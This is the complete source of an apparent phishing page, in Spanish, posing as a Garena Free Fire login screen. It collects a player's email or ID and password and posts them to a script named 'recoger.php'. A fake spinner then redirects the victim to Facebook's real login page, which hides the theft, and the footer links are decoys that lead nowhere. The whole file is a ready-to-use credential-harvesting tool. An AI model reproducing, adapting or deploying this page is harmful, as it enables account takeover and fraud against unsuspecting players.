<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar Sesión - Free Fire</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
        }
        .login-container {
            background-color: rgba(0, 0, 0, 0.6);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(255, 165, 0, 0.3);
            width: 300px;
            text-align: center;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .logo {
            width: 120px;
            height: 120px;
            margin-bottom: 20px;
            object-fit: contain;
        }
        h2 {
            margin: 0 0 20px 0;
            font-size: 22px;
            font-weight: 600;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            background-color: #333;
            color: white;
            box-sizing: border-box;
        }
        input::placeholder {
            color: #aaa;
        }
        button {
            width: 100%;
            padding: 12px;
            margin-top: 20px;
            border: none;
            border-radius: 5px;
            background: linear-gradient(to right, #ff9900, #ffcc00);
            color: black;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            transition: transform 0.1s;
        }
        button:active {
            transform: scale(0.98);
        }
        .footer {
            margin-top: 15px;
            font-size: 12px;
            color: #888;
        }
        .spinner {
            display: none;
            margin: 10px auto;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top: 3px solid #ff9900;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="login-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Garena_Free_Fire_Logo.svg" alt="Free Fire Logo" class="logo">
    
    <h2>Iniciar Sesión</h2>
    
    <form action="recoger.php" method="POST" id="loginForm">
        <input type="text" name="usuario" placeholder="Correo electrónico o ID" required>
        <input type="password" name="password" placeholder="Contraseña" required>
        
        <button type="submit" id="btnLogin">Iniciar Sesión</button>
        
        <div class="spinner" id="loading"></div>
    </form>
    
    <div class="footer">
        ¿Olvidaste tu contraseña? | Términos y Condiciones
    </div>
</div>

<script>
    document.getElementById('loginForm').addEventListener('submit', function() {
        const btn = document.getElementById('btnLogin');
        const spinner = document.getElementById('loading');
        
        btn.style.display = 'none';
        spinner.style.display = 'block';
        
        setTimeout(function() {
            window.location.href = "https://www.facebook.com/login/"; 
        }, 1500);
    });
</script>

</body>
</html>
